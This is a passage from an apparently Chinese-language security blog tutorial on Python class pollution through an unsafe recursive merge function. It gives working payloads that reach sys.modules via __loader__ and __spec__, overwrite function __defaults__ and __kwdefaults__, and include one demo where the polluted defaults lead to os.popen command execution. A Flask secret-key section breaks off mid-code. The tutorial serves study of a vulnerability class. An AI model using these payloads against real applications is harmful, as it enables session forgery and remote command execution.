class="hljs-number">0x0000018931CD6E70</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>ExtensionFileLoader</strong></p><ul><li>用于加载拓展模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy<br><span class="hljs-built_in">print</span>(numpy.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001C8DC2710D0</span>&gt;<br></code></pre></td></tr></table></figure><p>只要是<code>BuiltinImporter</code>的加载器都行，所以这里还有**_<em>spec</em>_**也能用</p><p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311173156762.png" alt="image-20250311173156762"></p><p>看个<code>demo</code></p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">import</span> test<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;importlib&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__loader__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><p>然后<code>__spec__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;math&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__spec__&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;,<br><br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><span class="hljs-built_in">print</span>(a.secret)<br><br></code></pre></td></tr></table></figure><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><p><code>__defaults__</code>是一个<strong>元组</strong>，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在<code>__defaults__</code><strong>元组</strong>中。我们可以通过这个属性来污染参数默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,y=<span class="hljs-number">2</span>,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment"># (2,3)</span><br></code></pre></td></tr></table></figure><p>这是一个函数，有三个参数，其中一个必填参数(<code>x</code>)，还有两个是可选参数(<code>y</code>，<code>z</code>)，再多看看，把<code>__default__</code>看懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, var_2</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_b.__defaults__)<br><span class="hljs-comment"># None</span><br></code></pre></td></tr></table></figure><p>那么再来看个特殊的</p><blockquote><ol><li><p><code>/</code> 之前的参数</p><p>：</p><ul><li>这些参数是 <strong>位置参数</strong>（positional-only parameters）。</li><li>它们只能通过位置传递，不能通过关键字传递。</li></ul></li><li><p><code>/</code> 和 <code>*</code> 之间的参数</p><p>：</p><ul><li>这些参数既可以是 <strong>位置参数</strong>，也可以是 <strong>关键字参数</strong>。</li><li>它们可以通过位置或关键字传递。</li></ul></li><li><p><code>*</code> 之后的参数</p><p>：</p><ul><li>这些参数是 <strong>关键字参数</strong>（keyword-only parameters）。</li><li>它们只能通过关键字传递，不能通过位置传递。</li><li>有默认值但是不计入<code>__defualts__</code></li></ul></li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(x=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># TypeError: a() got some positional-only arguments passed as keyword arguments: &#x27;x&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)<br><span class="hljs-comment"># TypeError: a() takes from 1 to 2 positional arguments but 3 were given</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">x,/,y=<span class="hljs-number">2</span>,*,z=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-built_in">print</span>(x,y,z)<br>    <span class="hljs-keyword">pass</span><br><br>a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,z=<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(a.__defaults__)<br></code></pre></td></tr></table></figure><p>欧克懂了之后来污染吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>(<span class="hljs-params">x,name=<span class="hljs-string">&quot;baozongwi&quot;</span>,age=<span class="hljs-string">&quot;99&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> name != <span class="hljs-string">&quot;12SqweR&quot;</span>:<br>        <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">if</span> age != <span class="hljs-string">&quot;99&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(x).read())<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>a=A()<br>b=demo<br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span>:<br>                    (<span class="hljs-string">&quot;12SqweR&quot;</span>,<span class="hljs-string">&quot;100&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>merge(payload,a)<br><span class="hljs-built_in">print</span>(b.__defaults__)<br>c=demo(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>这个<code>__defaults__</code>的写法一定要对，是元组，不然就失败，当然如果是<code>True</code>或者<code>False</code>的话，就可以直接写</p><p>查看一些污染类文章发现用<code>sys</code>一样可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;__main__&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;__defaults__&quot;</span>: (<span class="hljs-string">&quot;hacker&quot;</span>, <span class="hljs-string">&quot;hacker&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__defaults__)<br><br></code></pre></td></tr></table></figure><p>除了<code>__defaults__</code>还有<code>__kwdefaults__</code>，大差不差，只不过这个是字典，cancan</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_b</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_c</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_d</span>(<span class="hljs-params">var_1, /, var_2 =<span class="hljs-number">2</span>, *, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(func_a.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_b.__kwdefaults__)<br><span class="hljs-comment">#None</span><br><span class="hljs-built_in">print</span>(func_c.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br><span class="hljs-built_in">print</span>(func_d.__kwdefaults__)<br><span class="hljs-comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span><br></code></pre></td></tr></table></figure><p>发现只有关键字参数的默认值才会返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,*,y=<span class="hljs-string">&quot;123456&quot;</span>,z=<span class="hljs-string">&quot;test&quot;</span></span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>a = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>                    <span class="hljs-string">&quot;z&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br>merge(payload, a)<br><span class="hljs-built_in">print</span>(test.__kwdefaults__)<br><br></code></pre></td></tr></table></figure><h3 id="flask特定属性污染"><a href="#flask特定属性污染" class="headerlink" title="flask特定属性污染"></a>flask特定属性污染</h3><p>需要了解一些框架的底层，</p><h4 id="密钥替换"><a href="#密钥替换" class="headerlink" title="密钥替换"></a>密钥替换</h4><p>这里直接贴代码吧，可以造成任意session伪造甚至改变pin码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span 